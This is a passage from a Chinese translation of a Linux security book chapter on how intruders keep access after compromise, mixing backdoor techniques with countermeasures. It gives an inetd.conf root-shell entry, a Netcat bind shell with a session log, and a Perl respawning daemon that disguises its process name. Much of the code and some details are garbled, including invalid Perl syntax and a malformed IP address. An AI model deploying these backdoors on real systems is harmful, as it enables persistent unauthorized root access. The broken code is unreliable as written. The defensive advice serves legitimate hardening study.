
![](33829ffb1435b4baef56cd228ec6cd_361_0)

# 第10 章：黑客如何维持访问

黑客可以做任何他想做的事。在这里他查看`/root`。他已经获取了`root`的密码和`.keys`的副本，并可以尝试使用它们。`root`的家目录下有一些可能是安装的文件（事实上，他完全可以运行`-qa`来确定这一点）。更有趣的是`root`正在主动破解那些可以破解的用户密码。黑客现在可以直接读取破解结果，他甚至不需要自己去破解。

TIP 在`/etc/inetd.conf`中添加`root` `shell`是维持访问权限的方法。然而，许多标准的脚本小子攻击也会创建这些`root` `shell`。因此，保护免受这种攻击不仅可以防止黑客维持已获取的访问，还可以保护你免受初始攻击。

## inetd Root Shell 防御措施

首先，如果你运行文件完整性检查，你可以捕获这种简单的攻击，因为`/etc/inetd.conf`被修改了。如果你配置了`ipchains`/`iptables`或防火墙，仅允许访问你所需的端口（例如`SSH`、`SMTP`和`HTTP`），黑客将无法连接到他运行`root` `shell`的端口。他被迫关闭一个现有的服务以便在该端口运行他的`root` `shell`。希望你会发现你的`http`守护进程运行异常，并在调查时发现你的机器已被入侵。

一如既往，使用`chattr +i`锁定`/etc/inetd.conf`和其他配置文件将要求黑客采取额外的步骤来`chattr -`这些文件，并防止大多数脚本小子攻击。

更好的方法是根本不运行`inetd`。通过`inetd`提供的许多服务并不是必需的；例如，`telnetd`、`rlogin`、`rshd`、`rexec`可以（并且应该）关闭并被`OpenSSH`替换，后者以更安全的方法提供相同的功能。

## 破解 Linux 揭秘：Linux 安全秘密与解决方案

在这种情况下，黑客只需要将他需要的条目写入如`/inetd.conf`的文件并手动运行`inetd.conf`：

```
hackedmachine# cat > /inetd.conf <<EOM

ingresslock stream tcp nowait root / /bin/bash -i

amanda stream tcp nowait root / /usr/bin/reboot

EOM

hackedmachine# /usr/sbin/inetd /inetd.conf
```

在上面的示例中，`ingresslock`和`amanda`端口将由手动启动的`inetd`进程处理。在这种情况下，第一个端口可以使用`root` `shell`，而第二个端口则提供了一个强制`root`重启的快速方法。

> 注意：如果要绑定的端口在`1023`以上，则此`inetd`就不需要以`root`身份运行。因此，尚未获得`root`权限的黑客可以以自己的身份运行他的`inetd`。如果他认为自己可能被发现，或者希望规避无意中登录审计日志（通过`syslog`或`utmp`和`wtmp`文件），那么这种方法将非常有用。

### 自定义 Inetd 服务器防御措施

其中一种很难防范。你可以通过移除`inetd`的执行权限来防止普通用户创建此后门。然而，任何已经获得某种访问权限的人都可能上传或编译他自己的`inetd`副本或其他类似程序的副本并执行它。因此，最好的限制仍然是通过防火墙或`iptables`规则集禁止访问除特定已绑定端口以外的所有入站访问，并通过定期扫描网络端口来密切监控你的端口。

### 使用 Netcat 提供入站 Root Shell

| 流行度 | 6 |
| :--- | :--- |
| 简单性 | 7 |
| 影响 | 9 |
| 风险等级 | 7 |

使用`inetd`（无论是实际系统守护进程还是黑客运行的个人副本）都是创建快速`root` `shell`的一种相当简单的方法。然而，这并不十分优雅，有真才的黑客更有可能使用自己编写的程序来实现同样的功能。我们向你展示它是多么简单，并提供了一些我们自己的脚本。通过跳过极其无聊的网络`socket`处理部分，我们将直接使用`Netcat`。`Netcat`是一个如此简单又极其实用的工具，值得被频繁调用。

## 第 10 章：黑客如何维持访问

首先，黑客在被黑的机器上创建一个简单的`shell`脚本并启动`Netcat`：

```
hackedmachine# cat /tmp/rootshell

!/bin/bash

/bin/bash -i

hackedmachine# nc -vv -l -p 9999 -e /tmp/rootshell

listening on [any] 9999 ...

connect to [127.0.0.1] from hackerbox.example.com [172.18.0.9.1] 2038
```

然后，他从他的机器连接：

```
hackerbox$ nc -vv hackedmachine.example.com 9999

hackedmachine.example.com [172.18.9.1] 9999 (7) open

stty: standard input: Invalid argument

[root@hackedmachine]# pwd

pwd

/root

[root@hackedmachine]# w

11:17am up 180 days, 38 min, 4 users, load average: 1.89, 1.56, 1.23

USER TTY FROM LOGIN IDLE JCPU PCPU WHAT

reegen tty ws5.example.com 27Nov 0 2days 0.33s 0.13s tsh

maddie pts/0 19Apr 0 1.00s 0.46s 7

chris pts/1 ws0.example.com 27Nov 0 16:52m 1.42s 1.01s /bin/mutt

ryan pts/2 ws0.example.com 27Nov 0 55:10 5.18s 1.17s bash
```

`/tmp/rootshell`仅仅是运行`bash -i`，就像我们在之前的`inetd`示例中做的那样。我们需要把它单独放在一个文件中，因为`Netcat`只允许`-e`参数后允许一个简单的程序名。作为额外，使用`Netcat`而不是`inetd`允许我们对`shell`进行作业控制。

`Netcat`的设计用于处理单连接，而不是`inetd`自动提供的无限连接。因此，我们需要编写一些辅助守护进程，每当之前的`Netcat`程序退出时启动`Netcat`。下面是一个可能的`Perl`示例：

```perl
#!/usr/bin/perl

# runnc Netcat root shell.

#

# Usage:

# 'runnc -d' 作为守护进程，

# 'runnc' 作为 Netcat 辅助程序（伪 shell）。
```

```perl
use POSIX;

$FAKENAME='flushd';

# # 保存实际进程名

$ME = $0;

# 隐藏进程名

$0 = $FAKENAME;
```

## 破解 Linux 揭秘：Linux 安全秘密

# 如果我们通过 'nc -e' 启动，将在无参数的情况下
# 被调用，因此作为伪 shell，循环处理
# 输入允许黑客运行命令

```perl
unless (@ARGV) {

  $=1;

  open STDERR,&STDOUT;

  print "Welcome to your root shell.\n"

  print "hackedbox# ";

  while (<>) {

    chomp($);

    system($_) && print "!\n";

    print "hackedbox# ";

  }

}

# 我们应该作为守护进程启动。

chdir '/'

# fork 分离并由 init 拥有。

# 脱离终端

fork; setid or die "Can't start a new session: $!"

while 1; {

  print "Running Netcat\n"

  # fork 并运行 Netcat 程序（隐藏其进程名到

  unless (open(NETCAT, "|")) {

    exec "/home/bin/nc" $FAKENAME;

    exit;

  } else {

    # 将命令行发送到 stdin 以从 ps 中隐藏。

    print NETCAT "-p 9999 -e $ME";

    close(NETCAT);

  }

  wait; # 等待 Netcat 完成。
}
```
